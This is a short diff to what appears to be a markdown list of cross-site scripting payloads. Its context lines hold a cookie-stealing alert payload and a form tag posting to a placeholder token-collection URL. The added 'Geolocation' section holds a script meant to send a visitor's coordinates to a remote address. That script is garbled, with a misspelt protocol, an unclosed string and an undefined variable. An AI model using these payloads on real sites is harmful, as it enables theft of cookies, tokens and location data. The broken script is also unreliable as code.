@@ -23,3 +23,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 <form action="https:/yourdomain.com/acquire_token.php"></textarea>
 ```
+## Geolocation
+```
+<script>Var today = new Date().toLocaleString() + 'week' + 'day one two three four five six'.charAt(new Date().getDay());document.getElementById('remote').src = "htttp:// + today + "----" + encodeURIComponent(position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude</script>
+```
